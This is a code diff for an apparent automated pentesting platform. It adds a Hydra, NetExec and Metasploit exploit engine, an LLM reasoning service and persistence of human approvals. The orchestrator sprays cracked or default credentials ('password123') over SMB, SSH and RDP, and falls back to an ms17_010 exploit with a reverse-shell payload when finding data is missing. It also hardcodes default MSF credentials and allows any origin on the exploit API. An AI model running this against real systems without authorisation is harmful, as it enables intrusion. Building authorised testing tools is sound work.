@@ -48,6 +48,8 @@ STREAMING_PROCESSOR_ENABLED=true
 STREAMING_BATCH_SIZE=10
 STREAMING_TIMEOUT=300.0
 STREAMING_RETRY_ATTEMPTS=3
+FILE:=1.0.0
+
 FILE:Dockerfile
 FROM python:3.11-slim
 
@@ -120,6 +122,57 @@ COPY shared /app/shared
 HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 CMD python3 -c "import requests; requests.get('http://localhost:8003/health')" || exit 1
 EXPOSE 8003
 CMD ["python3", "-m", "uvicorn", "services.recon_engine.main:app", "--host", "0.0.0.0", "--port", "8003"]
+FILE:Dockerfile.m4
+FROM python:3.11-slim
+
+# Instalar dependencias del sistema y herramientas de compilación para NetExec
+RUN apt-get update && apt-get install -y \
+    nmap \
+    hydra \
+    git \
+    gcc \
+    python3-dev \
+    libssl-dev \
+    libffi-dev \
+    && apt-get clean \
+    && rm -rf /var/lib/apt/lists/*
+
+# Instalar NetExec desde GitHub
+RUN pip install --no-cache-dir git+https://github.com/Pennyw0rth/NetExec
+
+WORKDIR /app
+
+# Copiar requerimientos e instalar
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Copiar estructura de paquetes necesaria
+COPY services/__init__.py /app/services/
+COPY services/exploit_engine /app/services/exploit_engine
+COPY shared /app/shared
+
+EXPOSE 8004
+
+# Comando para ejecutar la aplicación
+CMD ["uvicorn", "services.exploit_engine.main:app", "--host", "0.0.0.0", "--port", "8004"]
+FILE:Dockerfile.m8
+FROM python:3.11-slim
+
+WORKDIR /app
+
+# Copiar requerimientos e instalar
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Copiar estructura de paquetes necesaria
+COPY services/__init__.py /app/services/
+COPY services/ai_reasoning /app/services/ai_reasoning
+COPY shared /app/shared
+
+EXPOSE 8005
+
+# Comando para ejecutar la aplicación
+CMD ["uvicorn", "services.ai_reasoning.main:app", "--host", "0.0.0.0", "--port", "8005"]
 FILE:Dockerfile.scanner
 FROM python:3.11-slim
 
@@ -811,8 +864,6 @@ Status: SUCCESS
 if __name__ == "__main__":
     demo_scan()
 FILE:docker-compose.yml
-version: "3.9"
-
 networks:
   scanops:
     driver: bridge
@@ -969,6 +1020,65 @@ services:
         condition: service_healthy
       redis:
         condition: service_healthy
+
+  # services/exploit_engine (M4)
+  m4:
+    build:
+      context: .
+      dockerfile: Dockerfile.m4
+    container_name: scanops-m4
+    ports:
+      - "8004:8004"
+    command: uvicorn services.exploit_engine.main:app --host 0.0.0.0 --port 8004
+    environment:
+      DATABASE_URL: postgresql://scanops:scanops@postgres:5432/scanops
+      REDIS_URL: redis://redis:6379/0
+      MSF_HOST: 10.202.15.254
+      MSF_PORT: 55553
+      MSF_PASSWORD: [REDACTED]
+      NXC_TIMEOUT: 30
+      NXC_THREADS: 10
+      NXC_DEFAULT_DOMAIN: WORKGROUP
+      KILL_SWITCH_REDIS_URL: redis://redis:6379/0
+      MONITOR_SSH_USER: admin
+      MONITOR_SSH_PASSWORD: [REDACTED]
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    networks:
+      - scanops
+    restart: unless-stopped
+
+  # services/ai_reasoning (M8)
+  m8:
+    build:
+      context: .
+      dockerfile: Dockerfile.m8
+    container_name: scanops-m8
+    ports:
+      - "8005:8005"
+    command: uvicorn services.ai_reasoning.main:app --host 0.0.0.0 --port 8005
+    environment:
+      DATABASE_URL: postgresql://scanops:scanops@postgres:5432/scanops
+      REDIS_URL: redis://redis:6379/0
+      OLLAMA_BASE_URL: http://host.docker.internal:11434
+      OLLAMA_MODEL: qwen3.5:latest
+      M3_URL: http://scanner-engine:8002
+      M1_URL: http://m1:8001
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    networks:
+      - scanops
+    restart: unless-stopped
 
 volumes:
   pgdata:
@@ -3266,13 +3376,17 @@ SCHEMA DE RESPUESTA:
                 return f"Security rule matched for {finding.title}"
             return f"Vulnerability {finding.title} analyzed as real issue"
 FILE:services\ai_reasoning\human_validation.py
-# services/ai_reasoning/human_validation.py
-
 import logging
+import os
+import psycopg2
 from datetime import datetime
 from typing import Dict, Any, Optional
 
 logger = logging.getLogger(__name__)
+
+DB_CONFIG = {
+    "dsn": os.getenv("DATABASE_URL", "postgresql://scanops:scanops@postgres:5432/scanops")
+}
 
 async def process_human_decision(
     asset_id: str,
@@ -3283,24 +3397,7 @@ async def process_human_decision(
 ) -> Dict[str, Any]:
     """
     Implementa la validación humana obligatoria (US-4.8) para sugerencias de vectores de ataque.
-
-    Este módulo es el human-in-the-loop que permite al Responsable de Seguridad revisar,
-    corregir o rechazar las propuestas de la IA antes de que pasen al módulo de explotación (M4).
-    El registro de estas decisiones constituye evidencia requerida para el cumplimiento de
-    normativas ENS (op.pl.1, op.acc.5, op.exp.5).
-
-    Args:
-        asset_id: ID del activo afectado.
-        finding_id: ID de la vulnerabilidad/hallazgo.
-        decision: Estado final ("validada", "corregida", "rechazada").
-        corrected_module: Módulo MSF corregido (obligatorio si decision == "corregida").
-        operator_id: ID del operador/usuario que firma la decisión.
-
-    Returns:
-        Dict con el resultado de la validación listo para persistir en PostgreSQL.
-
-    Raises:
-        ValueError: Si los parámetros de decisión o módulo corregido no son válidos.
+    Persiste la decisión en la tabla m4_approvals para que el módulo M4 pueda ejecutarla.
     """
 
     # 1. Validar decisión
@@ -3312,48 +3409,98 @@ async def process_human_decision(
     if decision == "corregida" and (not corrected_module or not corrected_module.strip()):
         raise ValueError("Si la decisión es 'corregida', debe proporcionarse un 'corrected_module' no vacío.")
 
-    # 3. Lógica de estados finales y transformación
-    final_status = "pending_human_approval"
+    # 3. Mapear decisión a status
+    status_map = {
+        "validada": "approved",
+        "corregida": "approved_with_correction",
+        "rechazada": "rejected"
+    }
+    final_status = status_map[decision]
+    decided_at = datetime.utcnow()
 
-    if decision == "validada":
-        final_status = "approved"
-    elif decision == "corregida":
-        final_status = "approved_with_correction"
-    elif decision == "rechazada":
-        final_status = "rejected"
+    # 4. Persistir en m4_approvals
+    # Si existe registro previo con finding_id → actualizar status
+    # Si no existe → crear registro nuevo con status PENDING→final
+    conn = None
+    approval_id = None
+    try:
+        conn = psycopg2.connect(DB_CONFIG["dsn"])
+        with conn:
+            with conn.cursor() as cur:
+                # Buscar si ya existe aprobación para este finding
+                cur.execute(
+                    "SELECT id FROM m4_approvals WHERE cve_id = %s AND target_ip = %s ORDER BY created_at DESC LIMIT 1",
+                    (finding_id, asset_id)
+                )
+                row = cur.fetchone()
 
-    # 4. Preparar resultado de auditoría
-    decided_at = datetime.utcnow().isoformat()
+                if row:
+                    # Actualizar registro existente
+                    approval_id = row[0]
+                    cur.execute(
+                        """UPDATE m4_approvals
+                           SET status = %s,
+                               requester = %s,
+                               updated_at = %s
+                           WHERE id = %s""",
+                        (final_status, operator_id, decided_at, approval_id)
+                    )
+                    logger.info(f"[ENS_EVIDENCE] approval_id={approval_id} updated to {final_status} by {operator_id}")
+                else:
+                    # Crear nuevo registro
+                    cur.execute(
+                        """INSERT INTO m4_approvals
+                               (cve_id, target_ip, requester, status, created_at, updated_at)
+                           VALUES (%s, %s, %s, %s, %s, %s)
+                           RETURNING id""",
+                        (finding_id, asset_id, operator_id, final_status, decided_at, decided_at)
+                    )
+                    approval_id = cur.fetchone()[0]
+                    logger.info(f"[ENS_EVIDENCE] approval_id={approval_id} created with {final_status} by {operator_id}")
 
-    result = {
+    except Exception as e:
+        logger.error(f"Error persistiendo decisión humana en BD: {e}")
+        raise RuntimeError(f"No se pudo persistir la decisión en BD: {e}")
+    finally:
+        if conn:
+            conn.close()
+
+    # 5. Retornar resultado de auditoría
+    return {
+        "approval_id": approval_id,
         "asset_id": asset_id,
         "finding_id": finding_id,
         "decision": decision,
         "final_status": final_status,
+        "corrected_module": corrected_module if decision == "corregida" else None,
         "operator_id": operator_id,
-        "decided_at": decided_at,
-        "corrected_module": corrected_module if decision == "corregida" else None
+        "decided_at": decided_at.isoformat(),
+        "ens_evidence": f"op.pl.1 op.acc.5 op.exp.5 — decisión registrada"
     }
+FILE:services\ai_reasoning\main.py
+from fastapi import FastAPI
+from fastapi.middleware.cors import CORSMiddleware
+from services.ai_reasoning.api.router import router as ai_router
 
-    # 5. Logging estructurado - Evidencia ENS op.exp.5
-    # Estas líneas de log son fundamentales para la trazabilidad de auditoría
-    logger.info(
-        f"ENS_EVIDENCE | HumanDecision | Operator: {operator_id} | Asset: {asset_id} | "
-        f"Finding: {finding_id} | Decision: {decision} | Status: {final_status}"
-    )
+app = FastAPI(
+    title="ScanOPS AI Reasoning (M8)",
+    description="Motor de Razonamiento IA — US-4.x",
+    version="1.0.0",
+)
 
-    # TODO: Implementar persistencia en PostgreSQL (Módulo M8 Database)
-    # Se debe actualizar la tabla de sugerencias con la decisión del operador
-    # query = \"\"\"
-    #     UPDATE attack_vectors
-    #     SET status = %s,
-    #         msf_module = COALESCE(%s, msf_module),
-    #         decided_by = %s,
-    #         decided_at = %s
-    #     WHERE asset_id = %s AND finding_id = %s
-    # \"\"\"
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
-    return result
+app.include_router(ai_router)
+
+@app.get("/health")
+async def health():
+    return {"status": "ok", "service": "ai-reasoning", "module": "M8"}
 FILE:services\ai_reasoning\models.py
 from pydantic import BaseModel, Field
 from typing import Optional, List, Dict
@@ -5727,14 +5874,23 @@ FILE:services\ai_reasoning\tests\test_human_validation.py
 # services/ai_reasoning/tests/test_human_validation.py
 
 import pytest
+from unittest.mock import patch, MagicMock
 from services.ai_reasoning.human_validation import process_human_decision
 
 class TestHumanValidation:
     """Tests para validación humana (US-4.8)"""
 
     @pytest.mark.asyncio
-    async def test_process_decision_validated(self):
-        """Test: Decisión validada correctamente"""
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_validated(self, mock_connect):
+        """Test: Decisión validada correctamente (Mocked DB)"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+        mock_cur.fetchone.side_effect = [None, (1,)]
+
         result = await process_human_decision(
             asset_id="A01",
             finding_id="F01",
@@ -5750,8 +5906,16 @@ class TestHumanValidation:
         assert "decided_at" in result
 
     @pytest.mark.asyncio
-    async def test_process_decision_corrected(self):
-        """Test: Decisión corregida con nuevo módulo"""
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_corrected(self, mock_connect):
+        """Test: Decisión corregida con nuevo módulo (Mocked DB)"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+        mock_cur.fetchone.side_effect = [None, (2,)]
+
         result = await process_human_decision(
             asset_id="A02",
             finding_id="F02",
@@ -5764,8 +5928,16 @@ class TestHumanValidation:
         assert result["corrected_module"] == "exploit/windows/http/new_exploit"
 
     @pytest.mark.asyncio
-    async def test_process_decision_rejected(self):
-        """Test: Decisión rechazada"""
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_rejected(self, mock_connect):
+        """Test: Decisión rechazada (Mocked DB)"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+        mock_cur.fetchone.side_effect = [None, (3,)]
+
         result = await process_human_decision(
             asset_id="A03",
             finding_id="F03",
@@ -5787,6 +5959,95 @@ class TestHumanValidation:
         """Test: Decisión corregida sin módulo lanza ValueError"""
         with pytest.raises(ValueError, match="debe proporcionarse un 'corrected_module'"):
             await process_human_decision("A05", "F05", "corregida", None, "OP")
+
+    # --- NUEVOS TESTS SOLICITADOS ---
+
+    @pytest.mark.asyncio
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_persists_approved(self, mock_connect):
+        """Test: Verifica que una decisión validada persiste como approved"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+
+        # Mock fetchone -> None (no existe registro previo), luego (99,) (id del INSERT)
+        mock_cur.fetchone.side_effect = [None, (99,)]
+
+        result = await process_human_decision(
+            asset_id="A-01",
+            finding_id="F-01",
+            decision="validada",
+            corrected_module=None,
+            operator_id="admin"
+        )
+
+        assert result["final_status"] == "approved"
+        assert result["approval_id"] == 99
+        # Verificar que se llamó al INSERT
+        called_queries = [call[0][0] for call in mock_cur.execute.call_args_list]
+        assert any("INSERT INTO m4_approvals" in q for q in called_queries)
+
+    @pytest.mark.asyncio
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_updates_existing(self, mock_connect):
+        """Test: Verifica que si ya existe un registro se hace UPDATE"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+
+        # Mock fetchone -> (42,) (registro ya existe)
+        mock_cur.fetchone.return_value = (42,)
+
+        result = await process_human_decision(
+            asset_id="A-02",
+            finding_id="F-02",
+            decision="corregida",
+            corrected_module="exploit/linux/ssh/test",
+            operator_id="admin"
+        )
+
+        assert result["final_status"] == "approved_with_correction"
+        assert result["approval_id"] == 42
+        # Verificar que se llamó al UPDATE
+        called_queries = [call[0][0] for call in mock_cur.execute.call_args_list]
+        assert any("UPDATE m4_approvals" in q for q in called_queries)
+
+    @pytest.mark.asyncio
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_process_decision_rejected_persists(self, mock_connect):
+        """Test: Verifica que una decisión rechazada también se persiste"""
+        mock_conn = MagicMock()
+        mock_cur = MagicMock()
+        mock_connect.return_value = mock_conn
+        mock_conn.__enter__.return_value = mock_conn
+        mock_conn.cursor.return_value.__enter__.return_value = mock_cur
+        mock_cur.fetchone.side_effect = [None, (101,)]
+
+        result = await process_human_decision(
+            asset_id="A-03",
+            finding_id="F-03",
+            decision="rechazada",
+            corrected_module=None,
+            operator_id="admin"
+        )
+
+        assert result["final_status"] == "rejected"
+        assert result["approval_id"] == 101
+        called_queries = [call[0][0] for call in mock_cur.execute.call_args_list]
+        assert any("INSERT INTO m4_approvals" in q for q in called_queries)
+
+    @pytest.mark.asyncio
+    @patch("services.ai_reasoning.human_validation.psycopg2.connect")
+    async def test_db_error_raises_runtime(self, mock_connect):
+        """Test: Verifica que errores de DB lanzan RuntimeError"""
+        mock_connect.side_effect = Exception("DB down")
+
+        with pytest.raises(RuntimeError, match="No se pudo persistir la decisión en BD"):
+            await process_human_decision("A", "F", "validada", None, "OP")
 FILE:services\ai_reasoning\tests\test_ollama_client.py
 """
 test_ollama_client.py — Suite de tests para OllamaClient.
@@ -10030,21 +10291,35 @@ class CancelTokenService:
 cancel_token_svc = CancelTokenService()
 FILE:services\exploit_engine\config.py
 # config.py
+import os
 
 MSF_CONFIG = {
-    'host': 'localhost',  # Via tunnel SSH
-    'port': 55553,
-    'username': 'msf',
-    'password': 'scanops2024'
+    'host': os.getenv('MSF_HOST', 'localhost'),
+    'port': int(os.getenv('MSF_PORT', '55553')),
+    'username': os.getenv('MSF_USERNAME', 'msf'),
+    'password': os.getenv('MSF_PASSWORD', 'scanops2024'),
 }
 
-DB_CONFIG = {
-    'host': 'localhost',  # Docker en Windows
-    'port': 5432,
-    'database': 'scanops',
-    'user': 'scanops',
-    'password': 'scanops'
-}
+import urllib.parse
+
+_db_url = os.getenv("DATABASE_URL", "")
+if _db_url:
+    _r = urllib.parse.urlparse(_db_url)
+    DB_CONFIG = {
+        'host': _r.hostname,
+        'port': _r.port or 5432,
+        'database': _r.path.lstrip('/'),
+        'user': _r.username,
+        'password': _r.password,
+    }
+else:
+    DB_CONFIG = {
+        'host': os.getenv('DB_HOST', 'localhost'),
+        'port': int(os.getenv('DB_PORT', '5432')),
+        'database': os.getenv('DB_NAME', 'scanops'),
+        'user': os.getenv('DB_USER', 'scanops'),
+        'password': os.getenv('DB_PASSWORD', 'scanops'),
+    }
 
 TARGETS = [
     {
@@ -10083,7 +10358,8 @@ M4_ALERT_PRIORITY = {
 # US-5.9 - Production Monitor
 MONITOR_CONFIG = {
     'target_ip': '10.202.15.100',
-    'ssh_user': 'admin',
+    'ssh_user': os.getenv('MONITOR_SSH_USER', 'admin'),
+    'ssh_password': os.getenv('MONITOR_SSH_PASSWORD', ''),
     'ssh_key': None,
     'check_interval': 10,
     'cpu_threshold': 90,
@@ -10100,6 +10376,11 @@ HYDRA_CONFIG = {
     'timeout': 300,
     'threads': 4
 }
+
+# US-5.2 - NetExec
+NXC_TIMEOUT = int(os.getenv("NXC_TIMEOUT", "30"))
+NXC_THREADS = int(os.getenv("NXC_THREADS", "10"))
+NXC_DEFAULT_DOMAIN = os.getenv("NXC_DEFAULT_DOMAIN", "WORKGROUP")
 FILE:services\exploit_engine\exploit_executor.py
 """
 Exploit Executor
@@ -11319,6 +11600,7 @@ try:
     from exploit_executor import get_executor
     from msf_client import get_msf_client
     from hydra_executor import get_hydra_executor
+    from netexec_client import get_netexec_client
     from production_monitor import get_monitor
     from approval_service import ApprovalService
 except ImportError as e:
@@ -11338,15 +11620,17 @@ class M4Orchestrator:
     1. Obtiene aprobaciones pendientes
     2. Inicia monitor de producción (US-5.9)
     3. FASE 1: Password Cracking con Hydra (US-5.2)
-    4. FASE 2: Exploits Metasploit (US-5.5)
-    5. Para monitor al terminar
-    6. Si kill_switch se activa (manual o automático): aborta TODO
+    4. FASE 1.5: Movimiento Lateral con NetExec (US-5.2)
+    5. FASE 2: Exploits Metasploit (US-5.5)
+    6. Para monitor al terminar
+    7. Si kill_switch se activa (manual o automático): aborta TODO
     """
 
     def __init__(self, db_config=None):
         self.db_config = db_config or DB_CONFIG
         self.executor = get_executor()
         self.hydra_executor = get_hydra_executor()
+        self.netexec = get_netexec_client()
         self.msf = get_msf_client()
         self.approval_svc = ApprovalService(db_config)
 
@@ -11404,6 +11688,7 @@ class M4Orchestrator:
         logger.info(f"📋 {len(approvals)} aprobaciones pendientes")
 
         hydra_cracks = 0
+        netexec_laterals = 0
         exploits_executed = 0
         exploits_failed = 0
 
@@ -11422,6 +11707,7 @@ class M4Orchestrator:
                 return {
                     'success': False,
                     'hydra_cracks': hydra_cracks,
+                    'netexec_laterals': netexec_laterals,
                     'exploits_executed': exploits_executed,
                     'exploits_failed': exploits_failed,
                     'aborted': True,
@@ -11433,7 +11719,11 @@ class M4Orchestrator:
             # ═══════════════════════════════════════════════════════════════
 
             logger.info("🔍 Iniciando monitor de producción...")
-            monitor = get_monitor(config={'target_ip': target_ip})
+            monitor = get_monitor(config={
+                'target_ip': target_ip,
+                'ssh_user': os.getenv('MONITOR_SSH_USER', 'admin'),
+                'ssh_password': os.getenv('MONITOR_SSH_PASSWORD', ''),
+            })
             monitor.start(approval_id)
 
             try:
@@ -11470,10 +11760,61 @@ class M4Orchestrator:
                     return {
                         'success': False,
                         'hydra_cracks': hydra_cracks,
+                        'netexec_laterals': netexec_laterals,
                         'exploits_executed': exploits_executed,
                         'exploits_failed': exploits_failed,
                         'aborted': True,
                         'reason': 'Kill switch activated during hydra cracking'
+                    }
+
+                # ═══════════════════════════════════════════════════════════
+                # FASE 1.5: NETEXEC LATERAL MOVEMENT (US-5.2)
+                # ═══════════════════════════════════════════════════════════
+
+                logger.info("🎯 FASE 1.5: NetExec Lateral Movement")
+
+                # Intentamos usar credenciales encontradas por Hydra o por defecto
+                creds_to_test = self._get_discovered_credentials(approval_id)
+                if not creds_to_test:
+                    # Si no hay credenciales descubiertas, usamos las por defecto de los puertos vulnerables
+                    creds_to_test = [{"username": p["username"], "password": "password123"} for p in vulnerable_ports]
+
+                for cred in creds_to_test:
+                    for port_info in vulnerable_ports:
+                        if kill_switch_svc.is_active():
+                            logger.warning("🛑 KILL SWITCH activado durante NetExec")
+                            break
+
+                        protocol = port_info['service']
+                        if protocol not in ['smb', 'ssh', 'rdp']:
+                            continue
+
+                        logger.info(f"  Probando {protocol} en {target_ip} con {cred['username']}")
+
+                        res = {}
+                        if protocol == 'smb':
+                            res = self.netexec.check_smb(target_ip, cred['username'], cred.get('password', ''))
+                        elif protocol == 'ssh':
+                            res = self.netexec.check_ssh(target_ip, cred['username'], cred.get('password', ''))
+                        elif protocol == 'rdp':
+                            res = self.netexec.check_rdp(target_ip, cred['username'], cred.get('password', ''))
+
+                        if res.get('lateral_movement_possible'):
+                            logger.info(f"🔥 MOVIMIENTO LATERAL POSIBLE: {protocol} en {target_ip} ({cred['username']})")
+                            netexec_laterals += 1
+                            self._persist_netexec_result(approval_id, target_ip, protocol, cred['username'], res)
+
+                # CHECK KILL SWITCH DESPUÉS DE NETEXEC
+                if kill_switch_svc.is_active():
+                    logger.warning(f"🛑 KILL SWITCH activado después de NetExec")
+                    return {
+                        'success': False,
+                        'hydra_cracks': hydra_cracks,
+                        'netexec_laterals': netexec_laterals,
+                        'exploits_executed': exploits_executed,
+                        'exploits_failed': exploits_failed,
+                        'aborted': True,
+                        'reason': 'Kill switch activated during lateral movement phase'
                     }
 
                 # ═══════════════════════════════════════════════════════════
@@ -11516,6 +11857,7 @@ class M4Orchestrator:
                     return {
                         'success': False,
                         'hydra_cracks': hydra_cracks,
+                        'netexec_laterals': netexec_laterals,
                         'exploits_executed': exploits_executed,
                         'exploits_failed': exploits_failed,
                         'aborted': True,
@@ -11530,13 +11872,15 @@ class M4Orchestrator:
         logger.info("=" * 80)
         logger.info(f"📊 RESUMEN:")
         logger.info(f"  - Credenciales crackeadas: {hydra_cracks}")
+        logger.info(f"  - Movimientos laterales posibles: {netexec_laterals}")
         logger.info(f"  - Exploits ejecutados: {exploits_executed}")
         logger.info(f"  - Exploits fallidos: {exploits_failed}")
         logger.info("=" * 80)
 
         return {
-            'success': exploits_executed > 0 or exploits_failed == 0,
+            'success': exploits_executed > 0 or netexec_laterals > 0 or exploits_failed == 0,
             'hydra_cracks': hydra_cracks,
+            'netexec_laterals': netexec_laterals,
             'exploits_executed': exploits_executed,
             'exploits_failed': exploits_failed,
             'aborted': False,
@@ -11583,21 +11927,23 @@ class M4Orchestrator:
         try:
             conn = self._get_connection()
 
+            # Intentamos usar la tabla real de M3: vuln_findings + assets
             query = """
                 SELECT DISTINCT
-                    port,
-                    service,
+                    f.affected_port as port,
+                    f.affected_service as service,
                     CASE
-                        WHEN service = 'ssh' THEN 'root'
-                        WHEN service = 'ftp' THEN 'anonymous'
-                        WHEN service = 'smb' THEN 'Administrator'
-                        WHEN service = 'http' THEN 'admin'
+                        WHEN f.affected_service = 'ssh' THEN 'root'
+                        WHEN f.affected_service = 'ftp' THEN 'anonymous'
+                        WHEN f.affected_service = 'smb' THEN 'Administrator'
+                        WHEN f.affected_service = 'http' THEN 'admin'
                         ELSE 'admin'
                     END as username
-                FROM vulnerabilities
-                WHERE target_ip = %s
-                AND status = 'confirmed'
-                AND port IN (21, 22, 80, 445, 3306, 5432)
+                FROM vuln_findings f
+                JOIN assets a ON f.asset_id = a.id
+                WHERE a.ip = %s
+                AND f.remediation_status != 'closed'
+                AND f.affected_port IN (21, 22, 80, 445, 3306, 5432)
                 ORDER BY port
             """
 
@@ -11608,8 +11954,12 @@ class M4Orchestrator:
             return ports or []
 
         except Exception as e:
-            logger.error(f"❌ Error obteniendo puertos vulnerables: {e}")
-            return []
+            logger.warning(f"⚠️ Error obteniendo puertos de vuln_findings, usando defaults: {e}")
+            # Fallback a puertos comunes si falla la query
+            return [
+                {'port': 22, 'service': 'ssh', 'username': 'root'},
+                {'port': 445, 'service': 'smb', 'username': 'Administrator'}
+            ]
         finally:
             if conn:
                 conn.close()
@@ -11620,9 +11970,10 @@ class M4Orchestrator:
         try:
             conn = self._get_connection()
 
+            # Tabla real de M3: vuln_findings
             query = """
-                SELECT * FROM vulnerabilities
-                WHERE cve_id = %s
+                SELECT * FROM vuln_findings
+                WHERE vulnerability_id = %s
                 LIMIT 1
             """
 
@@ -11632,17 +11983,29 @@ class M4Orchestrator:
 
             if vuln:
                 return {
-                    'msf_module': vuln.get('msf_module', 'exploit/windows/smb/ms17_010'),
-                    'payload': vuln.get('payload', 'generic/shell_reverse_tcp'),
-                    'port': vuln.get('port', 445),
-                    'platform': vuln.get('platform', 'windows')
+                    'msf_module': vuln.get('msf_module') or 'exploit/windows/smb/ms17_010',
+                    'payload': vuln.get('payload') or 'generic/shell_reverse_tcp',
+                    'port': vuln.get('affected_port') or 445,
+                    'platform': vuln.get('asset_os') or 'windows'
                 }
 
-            return None
+            # Si no existe en la tabla, devolvemos defaults basados en el CVE o genéricos
+            # permitiendo que la fase 2 continúe
+            return {
+                'msf_module': 'exploit/windows/smb/ms17_010',
+                'payload': 'generic/shell_reverse_tcp',
+                'port': 445,
+                'platform': 'windows'
+            }
 
         except Exception as e:
-            logger.error(f"❌ Error obteniendo vulnerabilidad: {e}")
-            return None
+            logger.warning(f"⚠️ Error obteniendo vulnerabilidad de DB: {e}. Usando defaults.")
+            return {
+                'msf_module': 'exploit/windows/smb/ms17_010',
+                'payload': 'generic/shell_reverse_tcp',
+                'port': 445,
+                'platform': 'windows'
+            }
         finally:
             if conn:
                 conn.close()
@@ -11675,6 +12038,50 @@ class M4Orchestrator:
             if conn:
                 conn.close()
 
+    def _get_discovered_credentials(self, approval_id: int) -> List[Dict]:
+        """Obtiene credenciales encontradas por Hydra para esta aprobación"""
+        conn = None
+        try:
+            conn = self._get_connection()
+            query = "SELECT username, password FROM hydra_results WHERE approval_id = %s AND success = TRUE"
+            with conn.cursor(cursor_factory=RealDictCursor) as cur:
+                cur.execute(query, (approval_id,))
+                return cur.fetchall()
+        except Exception as e:
+            logger.error(f"❌ Error obteniendo credenciales descubiertas: {e}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+
+    def _persist_netexec_result(self, approval_id: int, target_ip: str, protocol: str, username: str, result: Dict):
+        """Persiste resultado de NetExec en DB"""
+        conn = None
+        try:
+            conn = self._get_connection()
+            query = """
+                INSERT INTO netexec_results
+                (approval_id, target_ip, protocol, username, success, output, shares_found, lateral_movement_possible, duration_seconds)
+                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
+            """
+            shares_json = json.dumps(result.get('shares_found', []))
+            params = (
+                approval_id, target_ip, protocol, username,
+                result.get('success', False), result.get('output', ''),
+                shares_json, result.get('lateral_movement_possible', False),
+                result.get('duration_seconds', 0)
+            )
+            with conn.cursor() as cur:
+                cur.execute(query, params)
+                conn.commit()
+        except Exception as e:
+            logger.error(f"❌ Error persistiendo resultado NetExec: {e}")
+            if conn:
+                conn.rollback()
+        finally:
+            if conn:
+                conn.close()
+
 # Singleton instance
 _orchestrator = None
 
@@ -11691,33 +12098,49 @@ if __name__ == "__main__":
     print(f"\nResultado: {result}")
 FILE:services\exploit_engine\main.py
 from fastapi import FastAPI
-from exploit_engine.m4_orchestrator import get_orchestrator
-from api.patch_api import router as patch_router
+from fastapi.middleware.cors import CORSMiddleware
+from services.exploit_engine.api.approval_api import router as approval_router
+from services.exploit_engine.api.cancel_api import router as cancel_router
+from services.exploit_engine.api.patch_api import router as patch_router
+
+app = FastAPI(
+    title="ScanOPS Exploit Engine (M4)",
+    description="Motor de Explotación — ENS Alto [op.exp.2]",
+    version="1.0.0",
+)
+app.add_middleware(CORSMiddleware, allow_origins=["*"],
+    allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
+
+app.include_router(approval_router)
+app.include_router(cancel_router)
 app.include_router(patch_router)
 
-app = FastAPI()
+@app.get("/health")
+async def health():
+    return {"status": "ok", "service": "exploit-engine", "module": "M4"}
 
 @app.post("/api/m4/execute")
 async def execute_m4(approval_id: int):
+    from services.exploit_engine.m4_orchestrator import get_orchestrator
     orchestrator = get_orchestrator()
     result = orchestrator.run(approval_id)
     return result
 FILE:services\exploit_engine\msf_client.py
 """
-MSF-RPC Client
-Conecta a Metasploit Framework via RPC y ejecuta exploits reales
+MSF-RPC Client (MessagePack version)
+Conecta a Metasploit Framework via RPC usando el protocolo MessagePack.
+Implementación ENS Alto [op.exp.2]
 """
 
 import requests
-import json
+import msgpack
 import logging
-import time
-import socket
-from typing import Dict, List, Optional
-from datetime import datetime
 import os
 import sys
+from typing import Dict, List, Optional, Any
+from datetime import datetime
 
+# Asegurar importaciones de config
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
 try:
@@ -11727,97 +12150,100 @@ except ImportError:
         'host': 'localhost',
         'port': 55553,
         'username': 'msf',
-        'password': 'scanops2024'
+        'password': 'scanops2024',
+        'timeout': 30
     }
 
 logger = logging.getLogger("MSFClient")
-logging.basicConfig(level=logging.INFO)
-
-class MSFClientException(Exception):
-    """Excepción base para errores MSF"""
-    pass
 
 class MSFClient:
     """
-    Cliente para Metasploit Framework RPC.
-    Conecta vía SSH tunnel a Kali/Metasploit y ejecuta exploits.
+    Cliente para Metasploit Framework RPC utilizando MessagePack.
     """
 
-    def __init__(self, host=None, port=None, username=None, password=None):
-        """
-        Inicializa cliente MSF.
-
-        Args:
-            host: Host de MSF RPC (default: localhost vía SSH tunnel)
-            port: Puerto de MSF RPC (default: 55553 via socat)
